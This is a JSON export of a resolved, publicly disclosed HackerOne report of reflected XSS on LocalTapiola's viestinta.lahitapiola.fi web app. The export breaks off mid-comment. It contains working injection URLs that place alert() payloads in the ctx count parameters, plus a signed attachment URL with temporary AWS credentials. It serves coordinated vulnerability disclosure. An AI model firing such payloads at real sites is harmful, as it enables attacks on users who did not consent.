{"id":191387,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTEzODc=","url":"https://hackerone.com/reports/191387","title":"Reflected XSS and Open Redirect in several parameters (viestinta.lahitapiola.fi)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-12-15T12:09:36.093Z","submitted_at":"2016-12-15T12:09:36.093Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sandh0t","url":"/sandh0t","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-06T09:08:43.330Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-04T09:08:26.697Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Basic report information\n**Summary:** \nHi,\nThe values within the **ctx** tag, are not filtered, they are reflected inside a javascript code  in http://viestinta.lahitapiola.fi/webApp/APP3242, which can be exploited to perform an  XSS Attack.\n\nThe parameter are:\n**ctx[othersDriving][ma_gallup][count]**\n**ctx[ownDriving][ma_gallup][count]**\n\n**Description:** \nThe values inside the **ctx** tag \u003ccount\u003e\u003c/count\u003e are not properly sanitized  in the following POST request :\n```\nPOST /webApp/APP3242 HTTP/1.1\nHost: viestinta.lahitapiola.fi\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1378\n\nctx=\u003cctx lang=\"en\" date=\"2016-12-15T11:03:03Z\" _target=\"web\" webApp-id=\"328793322\" _folderModel=\"nmsRecipient\"\u003e\u003cuserInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone current=\"Europe/Helsinki\" changed=\"false\"/\u003e\u003cactivityHistory\u003e\u003cactivity name=\"page\"/\u003e\u003cactivity name=\"query\"/\u003e\u003cactivity name=\"query2\"/\u003e\u003cactivity name=\"prefill\"/\u003e\u003c/activityHistory\u003e\u003cothersDriving\u003e\u003cma_gallup othersDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup othersDriving=\"vieressa_neuvominen\"\u003e\u003ccount\u003e7777\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup othersDriving=\"huonot_parkkeeraustaidot\"\u003e\u003ccount\u003e906\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup othersDriving=\"ajamisen_hitaus\"\u003e\u003ccount\u003e1963\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/othersDriving\u003e\u003cownDriving\u003e\u003cma_gallup ownDriving=\"liikennemerkit\"\u003e\u003ccount\u003e578\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup ownDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup ownDriving=\"taskuparkkeeraus\"\u003e\u003ccount\u003e5555\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup ownDriving=\"kartturin_taidot\"\u003e\u003ccount\u003e1605\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/ownDriving\u003e\u003c/ctx\u003e\n\n```\n\nUsing this payload **value ; alert()** to trigger an XSS.\n\nFurthermore this request can be changed from POST request to a GET, so an attacker can just send the following link to the victim to perform a successful remote attack.\n\n```\nhttp://viestinta.lahitapiola.fi/webApp/APP3242?ctx=\u003cctx+lang=\"en\"+date=\"2016-12-15T11:03:03Z\"+_target=\"web\"+webApp-id=\"328793322\"+_folderModel=\"nmsRecipient\"\u003e\u003cuserInfo+datakitInDatabase=\"true\"+homeDir=\"\"+instanceLocale=\"en-US\"+locale=\"en-US\"+login=\"webapp\"+loginCS=\"Web+applications+agent+(webapp)\"+loginId=\"3290\"+noConsoleCnx=\"true\"+orgUnitId=\"0\"+theme=\"\"+timezone=\"Europe/Helsinki\"+xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"+xmlns:ns=\"urn:xtk:session\"+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"+xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right+right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone+current=\"Europe/Helsinki\"+changed=\"false\"/\u003e\u003cactivityHistory\u003e\u003cactivity+name=\"page\"/\u003e\u003cactivity+name=\"query\"/\u003e\u003cactivity+name=\"query2\"/\u003e\u003cactivity+name=\"prefill\"/\u003e\u003c/activityHistory\u003e\u003cothersDriving\u003e\u003cma_gallup+othersDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"vieressa_neuvominen\"\u003e\u003ccount\u003e7777;+alert()\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"huonot_parkkeeraustaidot\"\u003e\u003ccount\u003e906\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"ajamisen_hitaus\"\u003e\u003ccount\u003e1963\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/othersDriving\u003e\u003cownDriving\u003e\u003cma_gallup+ownDriving=\"liikennemerkit\"\u003e\u003ccount\u003e578\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"taskuparkkeeraus\"\u003e\u003ccount\u003e5555\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"kartturin_taidot\"\u003e\u003ccount\u003e1605\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/ownDriving\u003e\u003c/ctx\u003e\n\n```\n**Domain:** \n       viestinta.lahitapiola.fi\n\n## Browsers / Apps Verified In:\n\n  All Browsers\n\n## Steps To Reproduce:\n\n  1. Just go to :\n\n```\nhttp://viestinta.lahitapiola.fi/webApp/APP3242?ctx=\u003cctx+lang=\"en\"+date=\"2016-12-15T11:03:03Z\"+_target=\"web\"+webApp-id=\"328793322\"+_folderModel=\"nmsRecipient\"\u003e\u003cuserInfo+datakitInDatabase=\"true\"+homeDir=\"\"+instanceLocale=\"en-US\"+locale=\"en-US\"+login=\"webapp\"+loginCS=\"Web+applications+agent+(webapp)\"+loginId=\"3290\"+noConsoleCnx=\"true\"+orgUnitId=\"0\"+theme=\"\"+timezone=\"Europe/Helsinki\"+xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"+xmlns:ns=\"urn:xtk:session\"+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"+xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right+right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone+current=\"Europe/Helsinki\"+changed=\"false\"/\u003e\u003cactivityHistory\u003e\u003cactivity+name=\"page\"/\u003e\u003cactivity+name=\"query\"/\u003e\u003cactivity+name=\"query2\"/\u003e\u003cactivity+name=\"prefill\"/\u003e\u003c/activityHistory\u003e\u003cothersDriving\u003e\u003cma_gallup+othersDriving=\"\"\u003e\u003ccount\u003e126;+alert(document.domain)\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"vieressa_neuvominen\"\u003e\u003ccount\u003e7777\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"huonot_parkkeeraustaidot\"\u003e\u003ccount\u003e906\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+othersDriving=\"ajamisen_hitaus\"\u003e\u003ccount\u003e1963\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/othersDriving\u003e\u003cownDriving\u003e\u003cma_gallup+ownDriving=\"liikennemerkit\"\u003e\u003ccount\u003e578\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"\"\u003e\u003ccount\u003e126\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"taskuparkkeeraus\"\u003e\u003ccount\u003e5555\u003c/count\u003e\u003c/ma_gallup\u003e\u003cma_gallup+ownDriving=\"kartturin_taidot\"\u003e\u003ccount\u003e1605\u003c/count\u003e\u003c/ma_gallup\u003e\u003c/ownDriving\u003e\u003c/ctx\u003e\n```\n\n## Additional material\n\n  See Attached POC\n\n## Related reports, best practices\n\n  [OWASP-recommendations]\n ","vulnerability_information_html":"\u003ch2 id=\"basic-report-information\"\u003eBasic report information\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003cbr\u003e\nHi,\u003cbr\u003e\nThe values within the \u003cstrong\u003ectx\u003c/strong\u003e tag, are not filtered, they are reflected inside a javascript code  in \u003ca title=\"http://viestinta.lahitapiola.fi/webApp/APP3242\" href=\"/redirect?url=http%3A%2F%2Fviestinta.lahitapiola.fi%2FwebApp%2FAPP3242\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://viestinta.lahitapiola.fi/webApp/APP3242\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, which can be exploited to perform an  XSS Attack.\u003c/p\u003e\n\n\u003cp\u003eThe parameter are:\u003cbr\u003e\n\u003cstrong\u003ectx[othersDriving][ma_gallup][count]\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003ectx[ownDriving][ma_gallup][count]\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003cbr\u003e\nThe values inside the \u003cstrong\u003ectx\u003c/strong\u003e tag \u0026lt;count\u0026gt;\u0026lt;/count\u0026gt; are not properly sanitized  in the following POST request :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /webApp/APP3242 HTTP/1.1\nHost: viestinta.lahitapiola.fi\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1378\n\nctx=\u0026lt;ctx lang=\u0026quot;en\u0026quot; date=\u0026quot;2016-12-15T11:03:03Z\u0026quot; _target=\u0026quot;web\u0026quot; webApp-id=\u0026quot;328793322\u0026quot; _folderModel=\u0026quot;nmsRecipient\u0026quot;\u0026gt;\u0026lt;userInfo datakitInDatabase=\u0026quot;true\u0026quot; homeDir=\u0026quot;\u0026quot; instanceLocale=\u0026quot;en-US\u0026quot; locale=\u0026quot;en-US\u0026quot; login=\u0026quot;webapp\u0026quot; loginCS=\u0026quot;Web applications agent (webapp)\u0026quot; loginId=\u0026quot;3290\u0026quot; noConsoleCnx=\u0026quot;true\u0026quot; orgUnitId=\u0026quot;0\u0026quot; theme=\u0026quot;\u0026quot; timezone=\u0026quot;Europe/Helsinki\u0026quot; xmlns:SOAP-ENV=\u0026quot;http://schemas.xmlsoap.org/soap/envelope/\u0026quot; xmlns:ns=\u0026quot;urn:xtk:session\u0026quot; xmlns:xsd=\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot; xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u0026gt;\u0026lt;login-right right=\u0026quot;admin\u0026quot;/\u0026gt;\u0026lt;/userInfo\u0026gt;\u0026lt;timezone current=\u0026quot;Europe/Helsinki\u0026quot; changed=\u0026quot;false\u0026quot;/\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity name=\u0026quot;page\u0026quot;/\u0026gt;\u0026lt;activity name=\u0026quot;query\u0026quot;/\u0026gt;\u0026lt;activity name=\u0026quot;query2\u0026quot;/\u0026gt;\u0026lt;activity name=\u0026quot;prefill\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;othersDriving\u0026gt;\u0026lt;ma_gallup othersDriving=\u0026quot;\u0026quot;\u0026gt;\u0026lt;count\u0026gt;126\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup othersDriving=\u0026quot;vieressa_neuvominen\u0026quot;\u0026gt;\u0026lt;count\u0026gt;7777\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup othersDriving=\u0026quot;huonot_parkkeeraustaidot\u0026quot;\u0026gt;\u0026lt;count\u0026gt;906\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup othersDriving=\u0026quot;ajamisen_hitaus\u0026quot;\u0026gt;\u0026lt;count\u0026gt;1963\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;/othersDriving\u0026gt;\u0026lt;ownDriving\u0026gt;\u0026lt;ma_gallup ownDriving=\u0026quot;liikennemerkit\u0026quot;\u0026gt;\u0026lt;count\u0026gt;578\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup ownDriving=\u0026quot;\u0026quot;\u0026gt;\u0026lt;count\u0026gt;126\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup ownDriving=\u0026quot;taskuparkkeeraus\u0026quot;\u0026gt;\u0026lt;count\u0026gt;5555\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup ownDriving=\u0026quot;kartturin_taidot\u0026quot;\u0026gt;\u0026lt;count\u0026gt;1605\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;/ownDriving\u0026gt;\u0026lt;/ctx\u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing this payload \u003cstrong\u003evalue ; alert()\u003c/strong\u003e to trigger an XSS.\u003c/p\u003e\n\n\u003cp\u003eFurthermore this request can be changed from POST request to a GET, so an attacker can just send the following link to the victim to perform a successful remote attack.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/APP3242?ctx=\u0026lt;ctx+lang=\u0026quot;en\u0026quot;+date=\u0026quot;2016-12-15T11:03:03Z\u0026quot;+_target=\u0026quot;web\u0026quot;+webApp-id=\u0026quot;328793322\u0026quot;+_folderModel=\u0026quot;nmsRecipient\u0026quot;\u0026gt;\u0026lt;userInfo+datakitInDatabase=\u0026quot;true\u0026quot;+homeDir=\u0026quot;\u0026quot;+instanceLocale=\u0026quot;en-US\u0026quot;+locale=\u0026quot;en-US\u0026quot;+login=\u0026quot;webapp\u0026quot;+loginCS=\u0026quot;Web+applications+agent+(webapp)\u0026quot;+loginId=\u0026quot;3290\u0026quot;+noConsoleCnx=\u0026quot;true\u0026quot;+orgUnitId=\u0026quot;0\u0026quot;+theme=\u0026quot;\u0026quot;+timezone=\u0026quot;Europe/Helsinki\u0026quot;+xmlns:SOAP-ENV=\u0026quot;http://schemas.xmlsoap.org/soap/envelope/\u0026quot;+xmlns:ns=\u0026quot;urn:xtk:session\u0026quot;+xmlns:xsd=\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot;+xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u0026gt;\u0026lt;login-right+right=\u0026quot;admin\u0026quot;/\u0026gt;\u0026lt;/userInfo\u0026gt;\u0026lt;timezone+current=\u0026quot;Europe/Helsinki\u0026quot;+changed=\u0026quot;false\u0026quot;/\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity+name=\u0026quot;page\u0026quot;/\u0026gt;\u0026lt;activity+name=\u0026quot;query\u0026quot;/\u0026gt;\u0026lt;activity+name=\u0026quot;query2\u0026quot;/\u0026gt;\u0026lt;activity+name=\u0026quot;prefill\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;othersDriving\u0026gt;\u0026lt;ma_gallup+othersDriving=\u0026quot;\u0026quot;\u0026gt;\u0026lt;count\u0026gt;126\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+othersDriving=\u0026quot;vieressa_neuvominen\u0026quot;\u0026gt;\u0026lt;count\u0026gt;7777;+alert()\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+othersDriving=\u0026quot;huonot_parkkeeraustaidot\u0026quot;\u0026gt;\u0026lt;count\u0026gt;906\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+othersDriving=\u0026quot;ajamisen_hitaus\u0026quot;\u0026gt;\u0026lt;count\u0026gt;1963\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;/othersDriving\u0026gt;\u0026lt;ownDriving\u0026gt;\u0026lt;ma_gallup+ownDriving=\u0026quot;liikennemerkit\u0026quot;\u0026gt;\u0026lt;count\u0026gt;578\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+ownDriving=\u0026quot;\u0026quot;\u0026gt;\u0026lt;count\u0026gt;126\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+ownDriving=\u0026quot;taskuparkkeeraus\u0026quot;\u0026gt;\u0026lt;count\u0026gt;5555\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+ownDriving=\u0026quot;kartturin_taidot\u0026quot;\u0026gt;\u0026lt;count\u0026gt;1605\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;/ownDriving\u0026gt;\u0026lt;/ctx\u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eDomain:\u003c/strong\u003e \u003cbr\u003e\n       viestinta.lahitapiola.fi\u003c/p\u003e\n\n\u003ch2 id=\"browsers-apps-verified-in\"\u003eBrowsers / Apps Verified In:\u003c/h2\u003e\n\n\u003cp\u003eAll Browsers\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eJust go to :\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/APP3242?ctx=\u0026lt;ctx+lang=\u0026quot;en\u0026quot;+date=\u0026quot;2016-12-15T11:03:03Z\u0026quot;+_target=\u0026quot;web\u0026quot;+webApp-id=\u0026quot;328793322\u0026quot;+_folderModel=\u0026quot;nmsRecipient\u0026quot;\u0026gt;\u0026lt;userInfo+datakitInDatabase=\u0026quot;true\u0026quot;+homeDir=\u0026quot;\u0026quot;+instanceLocale=\u0026quot;en-US\u0026quot;+locale=\u0026quot;en-US\u0026quot;+login=\u0026quot;webapp\u0026quot;+loginCS=\u0026quot;Web+applications+agent+(webapp)\u0026quot;+loginId=\u0026quot;3290\u0026quot;+noConsoleCnx=\u0026quot;true\u0026quot;+orgUnitId=\u0026quot;0\u0026quot;+theme=\u0026quot;\u0026quot;+timezone=\u0026quot;Europe/Helsinki\u0026quot;+xmlns:SOAP-ENV=\u0026quot;http://schemas.xmlsoap.org/soap/envelope/\u0026quot;+xmlns:ns=\u0026quot;urn:xtk:session\u0026quot;+xmlns:xsd=\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot;+xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u0026gt;\u0026lt;login-right+right=\u0026quot;admin\u0026quot;/\u0026gt;\u0026lt;/userInfo\u0026gt;\u0026lt;timezone+current=\u0026quot;Europe/Helsinki\u0026quot;+changed=\u0026quot;false\u0026quot;/\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity+name=\u0026quot;page\u0026quot;/\u0026gt;\u0026lt;activity+name=\u0026quot;query\u0026quot;/\u0026gt;\u0026lt;activity+name=\u0026quot;query2\u0026quot;/\u0026gt;\u0026lt;activity+name=\u0026quot;prefill\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;othersDriving\u0026gt;\u0026lt;ma_gallup+othersDriving=\u0026quot;\u0026quot;\u0026gt;\u0026lt;count\u0026gt;126;+alert(document.domain)\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+othersDriving=\u0026quot;vieressa_neuvominen\u0026quot;\u0026gt;\u0026lt;count\u0026gt;7777\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+othersDriving=\u0026quot;huonot_parkkeeraustaidot\u0026quot;\u0026gt;\u0026lt;count\u0026gt;906\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+othersDriving=\u0026quot;ajamisen_hitaus\u0026quot;\u0026gt;\u0026lt;count\u0026gt;1963\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;/othersDriving\u0026gt;\u0026lt;ownDriving\u0026gt;\u0026lt;ma_gallup+ownDriving=\u0026quot;liikennemerkit\u0026quot;\u0026gt;\u0026lt;count\u0026gt;578\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+ownDriving=\u0026quot;\u0026quot;\u0026gt;\u0026lt;count\u0026gt;126\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+ownDriving=\u0026quot;taskuparkkeeraus\u0026quot;\u0026gt;\u0026lt;count\u0026gt;5555\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;ma_gallup+ownDriving=\u0026quot;kartturin_taidot\u0026quot;\u0026gt;\u0026lt;count\u0026gt;1605\u0026lt;/count\u0026gt;\u0026lt;/ma_gallup\u0026gt;\u0026lt;/ownDriving\u0026gt;\u0026lt;/ctx\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"additional-material\"\u003eAdditional material\u003c/h2\u003e\n\n\u003cp\u003eSee Attached POC\u003c/p\u003e\n\n\u003ch2 id=\"related-reports-best-practices\"\u003eRelated reports, best practices\u003c/h2\u003e\n\n\u003cp\u003e[OWASP-recommendations]\u003c/p\u003e\n","bounty_amount":"450.0","formatted_bounty":"$450","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":143776,"file_name":"xss2.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/143/776/f836e45f0ac8a354679d0f48e5ba3e64b70fbac1/xss2.PNG?response-content-disposition=attachment%3B%20filename%3D%22xss2.PNG%22%3B%20filename%2A%3DUTF-8%27%27xss2.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQT27VLVF5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044921Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDyDghanG6vysQhpIAbM6%2FNloTNBCfelRP1BGB1eeXDqQIgbh0u2InfYPRbM%2F0t24amgCOkVvoWkVHPo82TR%2BcSzPAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDG%2B9r1w6aCtbN7N%2FgSqRA8D1stzGXUi9998X9PqljCsxgqGb%2Fp5uwkl6HJ0ecyYUUOvKKK5bmjBmyhHU2siTJ5oMPHjZxACmC8QQR3zoStgvndU2Zk5FbI60XrAqVuUH%2BAK8pT26qvrZcq89M6eB7hRHvO%2BlRluLVtVVrfnC9UY0ATKZRmiYQyw9njaWy8e1cjtpV8uOzRbjAhSciTaQQ4Rof7K88HsyWXiwgfBdP3a0%2F0Eg3oYuiHO02sK0kJaBKVYS07wec5XsHKb5ikjLS61g4AVfdD4E0s3BTqyyWJeUCuyZ2YF95UI2CgkxcN5uOwwloEhHGonUYBlgrAIqXt%2FcecQNzktOM4Kjb30muwbzt0arTqS1XHySraj31WYHm2Cjy8AzyWIgNzu3Fq1xIENb3SovWG27JzCLGUyEU3ScE8nRNwiiydbGzKllImVZY%2BlC%2Bix1yqgNQOGSyxfVhY5J1d45Od%2BL4mUjygcLy%2FfzSKLf2qk3Prr%2BvcoxR9uUbkbtYRAEtizE%2BcIlRuTm3EFnBIvoMHCuplZLf4vZOpMrMLy9qv8FOusBWsgqdyTGkJS5%2BgtM3tHipB468LJZahmRjNSAud9TlniHiRJFpE4feQDaRgu4UD5waPGdkb1Mb3i2BGePA4gRyDu2hwL2UgW1yGpknpSCsy8uyMOhlVuIUyq7t0qBeid6h%2BvKgio2%2B05MKsls9XtVWxBqwW4LqYzc6KBQa0dOAdmkMORLktM2DWUfeoN%2FP12TUiKzRe%2BPGjaA3xBRgCZ2zNYmbNzYsoqOBfPEmbGygz2YZR0LAXBWrVpPc%2FJcYMLT6Jiu%2B2LCo6XyNRnu8YlFqwJ3EhjYkRvFzarUXssQ7cQHuLkop%2BkUTr8Vig%3D%3D\u0026X-Amz-Signature=bcee1dcaa8ff0d904f17c6a7dc819122b12c6ec272315f1c4853948d9da61a46","file_size":38633,"type":"image/png"}],"allow_singular_disclosure_at":"2017-03-06T09:08:26.741Z","allow_singular_disclosure_after":-120426055.15253589,"singular_disclosure_allowed":true,"vote_count":12,"voters":["delimitry","tk0","sandh0t","circuit","mpz","eveeez","dkd","silv3rpoision","rbcafe","spetr0x","and 2 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1366350,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thanks for your thorough reports. This seems like a systemic issue in the platform with all the XSS's. The fix is most likely global (and underlying) and for that reason we will also process all similar and related findings as one. I would ask you to add you possible new findings into either this report or #191095 - this will also make it easier to communicate about possible retesting etc. Thanks.","markdown_message":"\u003cp\u003eHi, thanks for your thorough reports. This seems like a systemic issue in the platform with all the XSS\u0026#39;s. The fix is most likely global (and underlying) and for that reason we will also process all similar and related findings as one. I would ask you to add you possible new findings into either this report or \u003ca href=\"/reports/191095\"\u003e#191095\u003c/a\u003e - this will also make it easier to communicate about possible retesting etc. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-15T12:26:13.993Z","updated_at":"2016-12-15T12:26:13.993Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1367262,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThe same issue can also be found 